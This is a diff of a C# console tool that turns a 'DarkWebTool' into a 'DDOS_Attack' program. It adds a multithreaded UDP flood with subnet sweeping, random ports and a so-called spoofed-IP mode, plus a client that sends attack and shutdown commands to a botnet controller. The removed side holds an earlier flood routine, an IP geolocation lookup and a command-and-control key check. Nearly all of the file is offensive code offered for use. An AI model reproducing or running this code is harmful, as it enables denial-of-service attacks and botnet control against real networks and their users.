@@ -1,408 +1,346 @@
 using System;
-using System.Net.Http;
-using System.Threading.Tasks;
-using Newtonsoft.Json;
+using System.Collections.Generic;
 using System.Net;
 using System.Net.Sockets;
-using System.Security.Cryptography;
 using System.Text;
 using System.Threading;
 
-namespace DarkWebTool
+namespace DDOS_Attack
 {
     class Program
     {
-        static async Task Main(string[] args)
+        const int BUFFER_SIZE = 1024;
+        const string SPOOF_IP_RANGE = "192.168.1.";
+
+        static string GenerateRandomIP()
         {
+            Random rnd = new Random();
+            int randomNum = rnd.Next(1, 254);
+
+            string ip = SPOOF_IP_RANGE + randomNum.ToString();
+            return ip;
+        }
+
+        static byte[] GenerateRandomData(int size)
+        {
+            byte[] data = new byte[size];
+            new Random().NextBytes(data);
+            return data;
+        }
+
+        static void DDOSAttack(string targetIP, int targetPort, int numConnections, bool useSubnet, bool useRandomPort, bool useSpoofedIP, int attackDuration)
+        {
+            // Create a ManualResetEvent to signal when the attack duration is over
+            ManualResetEvent attackFinished = new ManualResetEvent(false);
+
+            List<Thread> threads = new List<Thread>();
+
+            for (int i = 0; i < numConnections; i++)
+            {
+                Thread thread = new Thread(() =>
+                {
+                    try
+                    {
+                        Random rnd = new Random();
+                        using (UdpClient udpClient = new UdpClient())
+                        {
+                            string ipToAttack = targetIP;
+                            int portToAttack = targetPort;
+
+                            if (useSubnet)
+                            {
+                                ipToAttack = targetIP.Substring(0, targetIP.LastIndexOf('.') + 1) + rnd.Next(1, 254);
+                            }
+
+                            DateTime endTime = DateTime.Now.AddSeconds(attackDuration);
+
+                            while (DateTime.Now < endTime)
+                            {
+                                if (useRandomPort)
+                                {
+                                    portToAttack = rnd.Next(1, 65535);
+                                }
+
+                                byte[] data = GenerateRandomData(BUFFER_SIZE);
+
+                                if (useSpoofedIP)
+                                {
+                                    string spoofedIP = GenerateRandomIP();
+                                    IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(spoofedIP), portToAttack);
+                                    udpClient.Send(data, data.Length, endPoint);
+                                }
+                                else
+                                {
+                                    udpClient.Send(data, data.Length, ipToAttack, portToAttack);
+                                }
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("Error: " + ex.Message);
+                    }
+                    finally
+                    {
+                        // Signal that this thread has finished its attack
+                        attackFinished.Set();
+                    }
+                });
+
+                thread.Start();
+                threads.Add(thread);
+            }
+
+            // Wait for all threads to signal that their attacks are finished
+            foreach (Thread thread in threads)
+            {
+                thread.Join();
+            }
+
+            // Wait for the specified attack duration before returning
+            attackFinished.WaitOne();
+        }
+
+        static void Main(string[] args)
+        {
+            // Set console foreground color
+            Console.ForegroundColor = ConsoleColor.Green;
+
+            // Display ASCII art
+            Console.WriteLine(" ___  __    ___  ___  ________      ___    ___ ________  ________  ________     ");
+            Console.WriteLine(@"|\  \|\  \ |\  \|\  \|\_____  \    |\  \  /  /|\   __  \|\   __  \|\  ___  \    ");
+            Console.WriteLine(@"\ \  \/  /|\ \  \\\  \\|___/  /|   \ \  \/  / | \  \|\  \ \  \|\  \ \____   \   ");
+            Console.WriteLine(@" \ \   ___  \ \  \\\  \   /  / /    \ \    / / \ \   __  \ \  \\\  \|____|\  \  ");
+            Console.WriteLine(@"  \ \  \\ \  \ \  \\\  \ /  /_/__    \/  /  /   \ \  \ \  \ \  \\\  \  __\_\  \ ");
+            Console.WriteLine(@"   \ \__\\ \__\ \_______\\________\__/  / /      \ \__\ \__\ \_______\|\_______\");
+            Console.WriteLine(@"    \|__| \|__|\|_______|\|_______|\___/ /        \|__|\|__|\|_______|\|_______|");
+            Console.WriteLine(@"                                  \|___|/                                        ");
+
+            Console.WriteLine(); // Add a blank line for spacing
+
             while (true)
             {
-                Console.ForegroundColor = ConsoleColor.DarkMagenta;
-                Console.WriteLine(" ___  __    ___  ___  ________      ___    ___ ________  ________  ________     ");
-                Console.WriteLine(@"|\  \|\  \ |\  \|\  \|\_____  \    |\  \  /  /|\   __  \|\   __  \|\  ___  \    ");
-                Console.WriteLine(@"\ \  \/  /|\ \  \\\  \\|___/  /|   \ \  \/  / | \  \|\  \ \  \|\  \ \____   \   ");
-                Console.WriteLine(@" \ \   ___  \ \  \\\  \   /  / /    \ \    / / \ \   __  \ \  \\\  \|____|\  \  ");
-                Console.WriteLine(@"  \ \  \\ \  \ \  \\\  \ /  /_/__    \/  /  /   \ \  \ \  \ \  \\\  \  __\_\  \ ");
-                Console.WriteLine(@"   \ \__\\ \__\ \_______\\________\__/  / /      \ \__\ \__\ \_______\|\_______\");
-                Console.WriteLine(@"    \|__| \|__|\|_______|\|_______|\___/ /        \|__|\|__|\|_______|\|_______|");
-                Console.WriteLine(@"                                  \|___|/                                        ");
-                Console.ResetColor();
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("\n1. Locate IP Address");
-                Console.WriteLine("2. Launch DDoS Attack");
+                Console.WriteLine("DDOS Attack Menu:");
+                Console.WriteLine("1. Start Attack");
+                Console.WriteLine("2. Connect to Botnet");
                 Console.WriteLine("3. Exit");
-                Console.Write("\nEnter your choice: ");
+
+                Console.Write("Enter your choice: ");
                 string choice = Console.ReadLine();
 
                 switch (choice)
                 {
                     case "1":
-                        await LocateIPAddress();
+                        StartAttack();
                         break;
                     case "2":
-                        LaunchDDoSAttack();
+                        ConnectToBotnet();
                         break;
                     case "3":
-                        Environment.Exit(0);
-                        break;
+                        Console.WriteLine("Exiting...");
+                        return;
                     default:
-                        Console.WriteLine("\nInvalid choice. Please try again.");
+                        Console.WriteLine("Invalid choice. Please enter a valid option.");
                         break;
                 }
+
+                Console.WriteLine();
             }
         }
 
-        // Other methods remain unchanged...
-
-        static async Task LocateIPAddress()
+        static void StartAttack()
         {
-            Console.Write("\nEnter IP Address: ");
-            string ipAddress = Console.ReadLine();
+            string targetIP = GetValidIPAddress("Enter the target IP address: ");
+            int targetPort = GetValidPort("Enter the target port: ");
+            int numConnections = GetValidNumber("Enter the number of connections: ");
+            bool useSubnet = GetValidBoolean("Use SUBNET option (true/false): ");
+            bool useRandomPort = GetValidBoolean("Use RANDOM PORT option (true/false): ");
+            bool useSpoofedIP = GetValidBoolean("Use SPOOFED IP option (true/false): ");
+            int attackDuration = GetValidNumber("Enter the duration of the attack in seconds: ");
 
-            using (HttpClient client = new HttpClient())
-            {
-                try
-                {
-                    string url = $"http://ip-api.com/json/{ipAddress}";
-                    HttpResponseMessage response = await client.GetAsync(url);
-
-                    if (response.IsSuccessStatusCode)
-                    {
-                        string json = await response.Content.ReadAsStringAsync();
-                        IPGeoData geoData = JsonConvert.DeserializeObject<IPGeoData>(json);
-
-                        Console.WriteLine($"\nCountry: {geoData.Country}");
-                        Console.WriteLine($"Region: {geoData.RegionName}");
-                        Console.WriteLine($"City: {geoData.City}");
-                        Console.WriteLine($"Coordinates: {geoData.Lat},{geoData.Lon}");
-                        Console.WriteLine($"Postal Code: {geoData.Zip}");
-                        Console.WriteLine($"ASN: {geoData.Asn}");
-                        Console.WriteLine($"Google Maps: https://www.google.com/maps/place/{geoData.Lat},{geoData.Lon}");
-                    }
-                    else
-                    {
-                        Console.WriteLine($"\nError: {response.StatusCode} - {response.ReasonPhrase}");
-                    }
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"\nError: {ex.Message}");
-                }
-            }
+            Console.WriteLine($"Starting DDOS Attack for {attackDuration} seconds...");
+            DDOSAttack(targetIP, targetPort, numConnections, useSubnet, useRandomPort, useSpoofedIP, attackDuration);
         }
 
-        static void LaunchDDoSAttack()
+        static void ConnectToBotnet()
         {
-            AttackParameters parameters = GetAttackParameters();
-            Console.ForegroundColor = ConsoleColor.DarkRed;
-            Console.WriteLine(@"    )                            )     )  ");
-            Console.WriteLine(@" ( /(    (       (        )   ( /(  ( /(  ");
-            Console.WriteLine(@" )\())  ))\  (   )\ )  ( /(   )\()) )\()) ");
-            Console.WriteLine(@"((_)\  /((_) )\ (()/(  )(_)) ((_)\ ((_)\  ");
-            Console.WriteLine(@"| |(_)(_))( ((_) )(_))((_)_  /  (_)/ _(_) ");
-            Console.WriteLine(@"| / / | || ||_ /| || |/ _` || () | \_, /  ");
-            Console.WriteLine(@"|_\_\  \_,_|/__| \_, |\__,_| \__/   /_/   ");
-            Console.WriteLine(@"                 |__/                     ");
-
-
-
-            if (VerifyBotnetKey())
-            {
-                LaunchAttackMenu(parameters);
-            }
-
-            Console.WriteLine("\nPress any key to continue...");
-            Console.ReadKey();
-        }
-
-        static bool VerifyBotnetKey()
-        {
-            Console.Write("Enter your botnet encryption key: ");
-            string botnetKey = Console.ReadLine();
-
-            Console.Write("Enter your C2 server IP address: ");
-            string c2ServerIp = Console.ReadLine();
-
-            Console.Write("Enter your C2 server port: ");
-            int c2ServerPort;
-            while (!int.TryParse(Console.ReadLine(), out c2ServerPort))
-            {
-                Console.WriteLine("Invalid port number. Please enter a valid integer value.");
-                Console.Write("Enter your C2 server port: ");
-            }
+            string botnetHost = GetValidHostname("Enter the botnet controller host name: ");
+            string botnetIP = ResolveHostnameToIP(botnetHost);
+            int botnetPort = GetValidPort("Enter the botnet controller port: ");
 
             try
             {
-                byte[] encryptedKey = EncryptKey(botnetKey);
-                string verificationResult = VerifyKey(c2ServerIp, c2ServerPort, encryptedKey);
-                Console.WriteLine("\nVerification Result: " + verificationResult);
-                return verificationResult == "Verified";
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("\nError: " + ex.Message);
-                return false;
-            }
-        }
-
-        static byte[] EncryptKey(string key)
-        {
-            using (Aes aes = Aes.Create())
-            {
-                aes.Key = Encoding.UTF8.GetBytes("your_secret_key"); // Replace with your secret key
-                aes.Mode = CipherMode.ECB;
-                aes.Padding = PaddingMode.PKCS7;
-
-                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);
-                byte[] keyBytes = Encoding.UTF8.GetBytes(key);
-
-                return encryptor.TransformFinalBlock(keyBytes, 0, keyBytes.Length);
-            }
-        }
-
-        static string VerifyKey(string serverIp, int serverPort, byte[] encryptedKey)
-        {
-            using (TcpClient client = new TcpClient(serverIp, serverPort))
-            {
+                using (TcpClient client = new TcpClient(botnetIP, botnetPort))
                 using (NetworkStream stream = client.GetStream())
                 {
-                    stream.Write(encryptedKey, 0, encryptedKey.Length);
+                    Console.WriteLine("Connected to botnet controller.");
 
-                    byte[] buffer = new byte[1024];
-                    int bytesRead = stream.Read(buffer, 0, buffer.Length);
-                    return Encoding.ASCII.GetString(buffer, 0, bytesRead);
-                }
-            }
-        }
-
-        static AttackParameters GetAttackParameters()
-        {
-            AttackParameters parameters = new AttackParameters();
-
-            while (true)
-            {
-                Console.WriteLine("\nStarting DDoS attack setup...\n");
-
-                parameters = new AttackParameters();
-
-                // Confirm target IP, port, attack duration, number of threads, packet size, packet package, subnet option, random port option
-                while (true)
-                {
-                    Console.Write("Enter target IP address: ");
-                    string input = Console.ReadLine();
-                    if (IPAddress.TryParse(input, out IPAddress ipAddress))
+                    while (true)
                     {
-                        parameters.TargetIP = input;
-                        break;
-                    }
-                    else
-                    {
-                        Console.WriteLine("Invalid IP address format. Please try again.");
-                    }
-                }
+                        Console.WriteLine("Botnet Command Menu:");
+                        Console.WriteLine("1. Initiate DDOS Attack");
+                        Console.WriteLine("2. Shutdown Botnet");
+                        Console.WriteLine("3. Exit");
 
-                // Confirm target port
-                while (true)
-                {
-                    Console.Write("Enter target port: ");
-                    if (int.TryParse(Console.ReadLine(), out int port) && port > 0 && port <= 65535)
-                    {
-                        parameters.TargetPort = port;
-                        break;
-                    }
-                    else
-                    {
-                        Console.WriteLine("Invalid port number. Please enter a valid port between 1 and 65535.");
-                    }
-                }
+                        Console.Write("Enter your choice: ");
+                        string choice = Console.ReadLine();
 
-                // Confirm attack duration
-                while (true)
-                {
-                    Console.Write("Enter attack duration (in seconds): ");
-                    if (int.TryParse(Console.ReadLine(), out int duration) && duration > 0)
-                    {
-                        parameters.AttackDurationSeconds = duration;
-                        break;
-                    }
-                    else
-                    {
-                        Console.WriteLine("Invalid duration. Please enter a valid duration in seconds.");
-                    }
-                }
-
-                // Confirm number of threads
-                while (true)
-                {
-                    Console.Write("Enter number of threads: ");
-                    if (int.TryParse(Console.ReadLine(), out int threads) && threads > 0)
-                    {
-                        parameters.NumThreads = threads;
-                        break;
-                    }
-                    else
-                    {
-                        Console.WriteLine("Invalid number of threads. Please enter a valid positive integer.");
-                    }
-                }
-
-                // Confirm packet size
-                while (true)
-                {
-                    Console.Write("Enter packet size in bytes: ");
-                    if (int.TryParse(Console.ReadLine(), out int size) && size > 0)
-                    {
-                        parameters.PacketSize = size;
-                        break;
-                    }
-                    else
-                    {
-                        Console.WriteLine("Invalid packet size. Please enter a valid positive integer.");
-                    }
-                }
-
-                // Confirm packet package
-                while (true)
-                {
-                    Console.Write("Enter packet package: ");
-                    if (int.TryParse(Console.ReadLine(), out int package) && package > 0)
-                    {
-                        parameters.PacketPackage = package;
-                        break;
-                    }
-                    else
-                    {
-                        Console.WriteLine("Invalid packet package. Please enter a valid positive integer.");
-                    }
-                }
-
-                // Confirm whether to use subnet option
-                Console.Write("Use SUBNET option? (Y/N): ");
-                parameters.UseSubnet = Console.ReadLine().ToUpper() == "Y";
-
-                // Confirm whether to use random port option
-                Console.Write("Use RANDOM PORT option? (Y/N): ");
-                parameters.UseRandomPort = Console.ReadLine().ToUpper() == "Y";
-
-                break;
-            }
-
-            return parameters;
-        }
-
-        static void LaunchAttackMenu(AttackParameters parameters)
-        {
-            bool stopAttack = false;
-
-            while (true)
-            {
-                Console.WriteLine("\nStarting attack...");
-                Console.WriteLine("Target IP: {0}", parameters.TargetIP);
-                Console.WriteLine("Target Port: {0}", parameters.TargetPort);
-                Console.WriteLine("Attack Duration: {0} seconds", parameters.AttackDurationSeconds);
-                Console.WriteLine("Number of Threads: {0}", parameters.NumThreads);
-                Console.WriteLine("Packet Size: {0} bytes", parameters.PacketSize);
-                Console.WriteLine("Packet Package: {0}", parameters.PacketPackage);
-                Console.WriteLine("Use SUBNET option: {0}", parameters.UseSubnet ? "Yes" : "No");
-                Console.WriteLine("Use RANDOM PORT option: {0}", parameters.UseRandomPort ? "Yes" : "No");
-
-                // Launch attack threads
-                for (int i = 0; i < parameters.NumThreads; i++)
-                {
-                    Thread thread = new Thread(() => LaunchAttack(parameters.TargetIP, parameters.TargetPort, parameters.PacketSize, parameters.PacketPackage, parameters.AttackDurationSeconds, parameters.UseSubnet, parameters.UseRandomPort, ref stopAttack));
-                    thread.Start();
-                }
-
-                // Wait for user input to stop the attack
-                Console.WriteLine("\nPress 'S' to stop the attack.");
-                while (Console.ReadKey(true).Key != ConsoleKey.S) { }
-                stopAttack = true;
-
-                Console.WriteLine("\nStopping attack...");
-
-                break;
-            }
-        }
-
-        static void LaunchAttack(string targetIP, int targetPort, int packetSize, int packetPackage, int attackDurationSeconds, bool useSubnet, bool useRandomPort, ref bool stopAttack)
-        {
-            try
-            {
-                using (var client = new UdpClient())
-                {
-                    byte[] data = new byte[packetSize];
-                    Random rand = new Random();
-                    DateTime endTime = DateTime.Now.AddSeconds(attackDurationSeconds);
-
-                    if (useSubnet)
-                    {
-                        // Get the /24 CIDR range of the target IP
-                        string[] octets = targetIP.Split('.');
-                        string subnet = $"{octets[0]}.{octets[1]}.{octets[2]}";
-
-                        while (DateTime.Now < endTime && !stopAttack)
+                        switch (choice)
                         {
-                            // Iterate over the /24 CIDR range and send packets to each IP
-                            for (int i = 1; i <= 255; i++)
-                            {
-                                string ipAddress = $"{subnet}.{i}";
-                                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ipAddress), targetPort);
-                                int port = useRandomPort ? rand.Next(1, 65535) : targetPort;
-
-                                for (int j = 0; j < packetPackage; j++)
-                                {
-                                    client.Send(data, data.Length, endPoint);
-                                }
-                            }
-
-                            // Sleep for a random duration to simulate variability
-                            Thread.Sleep(rand.Next(50, 200)); // Adjust this range for desired attack rate
+                            case "1":
+                                SendDDOSAttackCommand(stream);
+                                break;
+                            case "2":
+                                SendShutdownCommand(stream);
+                                break;
+                            case "3":
+                                Console.WriteLine("Exiting botnet connection...");
+                                return;
+                            default:
+                                Console.WriteLine("Invalid choice. Please enter a valid option.");
+                                break;
                         }
-                    }
-                    else
-                    {
-                        while (DateTime.Now < endTime && !stopAttack)
-                        {
-                            IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(targetIP), targetPort);
-                            int port = useRandomPort ? rand.Next(1, 65535) : targetPort;
 
-                            for (int i = 0; i < packetPackage; i++)
-                            {
-                                client.Send(data, data.Length, endPoint);
-                            }
-
-                            // Sleep for a random duration to simulate variability
-                            Thread.Sleep(rand.Next(50, 200)); // Adjust this range for desired attack rate
-                        }
+                        Console.WriteLine();
                     }
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine("An error occurred: " + ex.Message);
+                Console.WriteLine("Error connecting to botnet: " + ex.Message);
             }
         }
-    }
 
-    public class IPGeoData
-    {
-        public string Country { get; set; }
-        public string RegionName { get; set; }
-        public string City { get; set; }
-        public double Lat { get; set; }
-        public double Lon { get; set; }
-        public string Zip { get; set; }
-        public string Asn { get; set; }
-    }
+        static void SendDDOSAttackCommand(NetworkStream stream)
+        {
+            string targetIP = GetValidIPAddress("Enter the target IP address: ");
+            int targetPort = GetValidPort("Enter the target port: ");
+            int numConnections = GetValidNumber("Enter the number of connections: ");
+            bool useSubnet = GetValidBoolean("Use SUBNET option (true/false): ");
+            bool useRandomPort = GetValidBoolean("Use RANDOM PORT option (true/false): ");
+            bool useSpoofedIP = GetValidBoolean("Use SPOOFED IP option (true/false): ");
+            int attackDuration = GetValidNumber("Enter the duration of the attack in seconds: ");
 
-    public class AttackParameters
-    {
-        public string TargetIP { get; set; }
-        public int TargetPort { get; set; }
-        public int AttackDurationSeconds { get; set; }
-        public int NumThreads { get; set; }
-        public int PacketSize { get; set; }
-        public int PacketPackage { get; set; }
-        public bool UseSubnet { get; set; }
-        public bool UseRandomPort { get; set; }
+            string command = $"DDOS_ATTACK {targetIP} {targetPort} {numConnections} {useSubnet} {useRandomPort} {useSpoofedIP} {attackDuration}";
+            SendCommand(stream, command);
+        }
+
+        static void SendShutdownCommand(NetworkStream stream)
+        {
+            string command = "SHUTDOWN";
+            SendCommand(stream, command);
+        }
+
+        static void SendCommand(NetworkStream stream, string command)
+        {
+            byte[] data = Encoding.ASCII.GetBytes(command);
+            stream.Write(data, 0, data.Length);
+        }
+
+        static string ResolveHostnameToIP(string hostname)
+        {
+            try
+            {
+                IPAddress[] addresses = Dns.GetHostAddresses(hostname);
+                if (addresses.Length > 0)
+                {
+                    return addresses[0].ToString();
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error resolving hostname: " + ex.Message);
+            }
+            return null;
+        }
+
+        static string GetValidHostname(string prompt)
+        {
+            while (true)
+            {
+                Console.Write(prompt);
+                string input = Console.ReadLine();
+                if (!string.IsNullOrWhiteSpace(input))
+                {
+                    return input;
+                }
+                else
+                {
+                    Console.WriteLine("Hostname cannot be empty. Please enter a valid hostname.");
+                }
+            }
+        }
+
+        static string GetValidIPAddress(string prompt)
+        {
+            while (true)
+            {
+                Console.Write(prompt);
+                string input = Console.ReadLine();
+
+                if (IPAddress.TryParse(input, out IPAddress ipAddress))
+                {
+                    return ipAddress.ToString();
+                }
+                else
+                {
+                    Console.WriteLine("Invalid IP address. Please enter a valid IP address.");
+                }
+            }
+        }
+
+        static int GetValidPort(string prompt)
+        {
+            while (true)
+            {
+                Console.Write(prompt);
+                string input = Console.ReadLine();
+
+                if (int.TryParse(input, out int port) && port > 0 && port <= 65535)
+                {
+                    return port;
+                }
+                else
+                {
+                    Console.WriteLine("Invalid port. Please enter a valid integer port number between 1 and 65535.");
+                }
+            }
+        }
+
+        static int GetValidNumber(string prompt)
+        {
+            while (true)
+            {
+                Console.Write(prompt);
+                string input = Console.ReadLine();
+
+                if (int.TryParse(input, out int number) && number > 0)
+                {
+                    return number;
+                }
+                else
+                {
+                    Console.WriteLine("Invalid number. Please enter a valid positive integer.");
+                }
+            }
+        }
+
+        static bool GetValidBoolean(string prompt)
+        {
+            while (true)
+            {
+                Console.Write(prompt);
+                string input = Console.ReadLine();
+
+                if (bool.TryParse(input, out bool result))
+                {
+                    return result;
+                }
+                else
+                {
+                    Console.WriteLine("Invalid input. Please enter 'true' or 'false'.");
+                }
+            }
+        }
     }
 }
